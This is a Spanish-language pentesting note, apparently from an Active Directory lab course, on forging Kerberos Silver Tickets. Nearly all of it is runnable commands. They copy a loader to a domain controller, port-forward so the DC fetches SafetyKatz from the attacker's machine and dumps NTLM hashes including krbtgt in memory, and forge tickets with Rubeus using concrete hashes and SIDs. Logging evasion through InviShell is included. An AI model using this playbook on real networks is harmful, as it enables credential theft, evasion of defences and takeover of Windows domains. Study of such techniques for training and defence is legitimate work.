# Silver Ticket  

Tags: #AD #Windows #Powershell #Rubeus 

```bash  
# Si tienes acceso a las credenciales de una cuenta de máquina, puedes reenviar (forward) silver tickets

- Un ticket de servicio válido o ticket TGS (el Golden Ticket es un TGT).
- Cifrado y firmado con el hash de la cuenta de servicio (el Golden Ticket está firmado con el hash de krbtgt) del servicio que se ejecuta con esa cuenta.
- Los servicios rara vez validan el PAC (Privileged Attribute Certificate).
- Los servicios permitirán acceso únicamente a sí mismos.
- Periodo de persistencia razonable (por defecto 30 días para cuentas de equipo).


# Servicios SPN definidos más comúnes en AD:
1 SPN: Cifs (SMB)
	- C$, ADMIN$
2 SPN: HOST
	- WMI 
	- Scheduled Task 
	- RPC
3 SPN: HTTP
4 SPN: MSSQL
	- xp_cmdshell 
5 SPN: LDAP
6 SPN: ESMAN (Winrm) o rpcss
```

```powershell 
# Compartir el Loader en la sesión (cmd) con OPTH que tiene el ticket inyectado
❯ echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y    # Copiar Loader al DC desde la PC atacante
❯ winrs -r:dcorp-dc cmd     # Ingresar al server DC

# Ejecutar desde dentro del DC
❯ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
# Funciona para ejecutar directamente 'SafetyKatz' directamente en el DC sin descargarlo 
```

```powershell 
❯ echo F | xcopy C:\AD\Loader.exe \\dcorp-dc\C$\User\Public\Loader.exe /Y
# Copia Loader.exe al DC vía SMB (admin share) sobreescribiendo si existe, requiere acceso de administrador al DC.

❯ winrs -r:dcorp-dc cmd
# Abre una shell remota en el DC vía WinRM usando las credenciales actuales, alternativa ligera a PSRemoting.

❯ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=IP_WStudent
# Crea un port forwarding en el DC: redirige tráfico del puerto 8080 local hacia el puerto 80 del atacante, permite que el DC alcance el servidor HTTP donde está SafetyKatz.

❯ .\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
# Desde el DC, carga SafetyKatz en memoria vía el portforwarding y vuelca los hashes NTLM de todas las cuentas incluyendo krbtgt, evasión completa sin tocar disco.
```

```powershell 
# Extracción 
! Usuario: Domain Admin o cuenta con acceso administrativo al DC

❯ winrs -r:dcorp-dc cmd
# Abrir una shell remota en el DC vía WinRM usando las credenciales actuales.

❯ .\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
# Cargar SafetyKatz en memoria vía portforwarding y vuelcar hashes NTLM desde el DC — los hashes NTLM que muestra corresponden a los rc4 que se usan en Rubeus.

Nota
	- Cuando muestra los NTLM en esta ocasión son los rc4 que colocamos en el rubeus
```

## Rubeus - HTTP 

```powershell 
! Usuario: Domain Admin (requiere hash NTLM del servicio objetivo y SID del dominio)

!! Se necesita crear el ticket HTTP para poder hacer 'winrs, PowerShell Remoting, WinRM'
❯ .\Loader.exe -path C:\AD\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
# Cargar Rubeus en memoria vía Loader.exe y forjar el Silver Ticket en modo evasivo — inyecta el ticket directamente en el proceso actual.
	# El /service:SPN/MachineName.Domain.com
	# El /rc4:NTLM de máquina (DCORP-DC$)

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args klist
# Listar los tickets Kerberos activos en la sesión actual para verificar que el Silver Ticket fue inyectado correctamente.


❯ .\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
# Forjar e inyectar un Silver Ticket para el servicio HTTP del DC impersonando a Administrator — /ldap consulta al DC para obtener atributos del usuario. Aplicable también a HOST, RPCSS, CIFS y otros servicios. 
	# El /service:SPN/MachineName.Domain.com
	# El /rc4:NTLM de DCORP-DC$


Notes:
	1. Just like the Golden ticket, /ldap option queries DC for information related to the user.
	2. Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, CIFS and many more.
```

## Rubeus - WMI Service 

```powershell 
!! Se necesita el ticket HOST para poder hacer la ejecución de comandos 
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

```powershell 
# Ejecutar comandos con el ticket inyectado 
❯ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat                      # Ejecutar un Powershell discreto 

❯ Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc      # Consultar información del sistema operativo remotamente vía WMI
```

## Rubeus - RPCSS

```powershell 
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt 
```




![[Silver Attack 1.png]]